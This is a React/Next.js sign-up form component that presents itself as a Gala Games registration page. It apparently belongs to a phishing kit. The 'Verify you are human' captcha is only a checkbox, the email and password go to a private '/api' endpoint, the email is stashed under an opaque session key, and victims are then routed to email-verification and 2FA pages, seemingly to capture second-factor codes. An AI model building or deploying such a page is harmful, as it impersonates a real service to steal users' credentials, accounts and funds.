'use client'

import React, {useState} from 'react';
import {useForm} from 'react-hook-form';
import {yupResolver} from '@hookform/resolvers/yup';
import * as yup from 'yup';
import styles from './styles.module.css';
import {CustomCheckbox} from '../../common/checkbox';
import Image from 'next/image';
import {useRouter} from "next/navigation";
import {routeConstants} from "../../../../constants/route";
import {AppRouterInstance} from "next/dist/shared/lib/app-router-context.shared-runtime";

const schema = yup.object().shape({
  email: yup.string().email('Email is not valid').required('Email is required'),
  password: yup.string().min(6, 'Password must be at least 6 characters').required('Password is required'),
});


const getResponseRoute = (router: AppRouterInstance, type: 'email' | '2fa' | 'all') => {
  const navigationMapper = {
    'email': routeConstants.VERIFY_EMAIL,
    '2fa': routeConstants.TWO_FA,
  }

  if (type === 'all') {
    router.push(routeConstants.TWO_FA)
    sessionStorage.setItem('all', '1')
    return
  }

  router.push(navigationMapper[type as 'email' | '2fa'])
}

export const SignUpForm: React.FC = () => {
  const router = useRouter()
  const [checked, setChecked] = useState(false);
  const [loading, setLoading] = useState(false);
  const {register, handleSubmit, formState: {errors, isDirty, isValid}} = useForm({
    resolver: yupResolver(schema),
    mode: 'onChange'
  });

  const isDisabled = !isDirty || !isValid || !checked;
  const onSubmit = async (data: { email: string; password: string }) => {
    setLoading(true)

    sessionStorage.setItem('gd600-ap', data.email)

    const res = await fetch('/api', {
      method: 'POST',
      body: JSON.stringify(data),
    });

    const json = await res.json();


    getResponseRoute(router, json?.data?.key ?? 'email')
  };

  return (
    <div className={styles.container}>
      <div className={styles.form}>
        <div className={styles.logo}>
          <Image width={60} height={60} src="/icons/form-logo.png" alt="Logo"/>
        </div>
        <h2 className={styles.title}>Welcome</h2>
        <p className={styles.subtitle}>Register to continue to Gala Games.</p>
        <div className={styles.divider}>OR</div>

        <form className={styles.emailForm} onSubmit={handleSubmit(onSubmit)}>
          <div className={styles.inputWrapper}>
            <input
              type="email"
              placeholder="Email address"
              className={styles.input}
              {...register('email')}
            />
            {errors.email && <p className={styles.error}>{errors.email.message}</p>}
          </div>
          <div className={styles.inputWrapper}>
            <input
              type="password"
              placeholder="Password"
              className={styles.input}
              {...register('password')}
            />
            {errors.password && <p className={styles.error}>{errors.password.message}</p>}
          </div>
          <div className={styles.captcha}>
            <CustomCheckbox checked={checked} onChange={(e) => setChecked(e.target.checked)}/>
            <label htmlFor="captcha">Verify you are human</label>
          </div>
          <p className={styles.terms}>
            By continuing, you agree to the <a href="/terms">Terms & Conditions</a> and <a href="/privacy">Privacy
            Policy</a>
          </p>
          <button type="submit" disabled={isDisabled}
                  className={styles.continueButton}>{loading ? "Wait..." : "Continue"} </button>
        </form>


      </div>
    </div>
  );
};
